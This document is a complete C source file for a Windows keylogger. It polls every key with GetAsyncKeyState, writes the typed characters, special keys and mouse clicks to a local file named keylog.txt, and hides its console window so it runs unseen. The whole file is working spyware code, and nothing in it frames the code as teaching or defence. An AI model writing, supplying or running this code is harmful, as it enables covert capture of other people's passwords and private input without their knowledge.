#include <stdio.h>
#include <windows.h>

// File to save keystrokes
#define LOG_FILE "keylog.txt"

// Function to log a key press to a file
void logKey(int key) {
    FILE *file = fopen(LOG_FILE, "a+");
    if (file == NULL) {
        return;
    }

    // Map virtual key codes to readable characters and symbols
    switch (key) {
        case VK_SPACE:
            fprintf(file, " ");
            break;
        case VK_RETURN:
            fprintf(file, "\n[ENTER]\n");
            break;
        case VK_TAB:
            fprintf(file, "\t");
            break;
        case VK_BACK:
            fprintf(file, "[BACKSPACE]");
            break;
        case VK_SHIFT:
            fprintf(file, "[SHIFT]");
            break;
        case VK_CONTROL:
            fprintf(file, "[CTRL]");
            break;
        case VK_ESCAPE:
            fprintf(file, "[ESC]");
            break;
        case VK_END:
            fprintf(file, "[END]");
            break;
        case VK_HOME:
            fprintf(file, "[HOME]");
            break;
        case VK_LEFT:
            fprintf(file, "[LEFT]");
            break;
        case VK_UP:
            fprintf(file, "[UP]");
            break;
        case VK_RIGHT:
            fprintf(file, "[RIGHT]");
            break;
        case VK_DOWN:
            fprintf(file, "[DOWN]");
            break;
        case VK_CAPITAL:
            fprintf(file, "[CAPSLOCK]");
            break;
        case VK_LBUTTON:
            fprintf(file, "[LEFT CLICK]");
            break;
        case VK_RBUTTON:
            fprintf(file, "[RIGHT CLICK]");
            break;
        case VK_MBUTTON:
            fprintf(file, "[MIDDLE CLICK]");
            break;
        case VK_F1: case VK_F2: case VK_F3: case VK_F4:
        case VK_F5: case VK_F6: case VK_F7: case VK_F8:
        case VK_F9: case VK_F10: case VK_F11: case VK_F12:
            fprintf(file, "[F%d]", key - VK_F1 + 1);
            break;
        default:
            // Handle alphanumeric and other ASCII characters
            if ((key >= 'A' && key <= 'Z') || (key >= '0' && key <= '9')) {
                fprintf(file, "%c", key);
            } else {
                // Try to convert other keys
                char str[5];
                int ret = GetKeyNameTextA((LONG)MapVirtualKeyA(key, 0) << 16, str, sizeof(str));
                if (ret > 0) {
                    fprintf(file, "[%s]", str);
                }
            }
    }
    fclose(file);
}

int main() {
    // Hide the console window (optional)
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Infinite loop to capture keystrokes
    int key;
    while (1) {
        // Check all keys (ASCII range)
        for (key = 1; key <= 255; key++) {
            // If key is pressed
            if (GetAsyncKeyState(key) & 0x0001) {
                logKey(key);
            }
        }
        // Delay to avoid high CPU usage
        Sleep(10);
    }
    return 0;
}

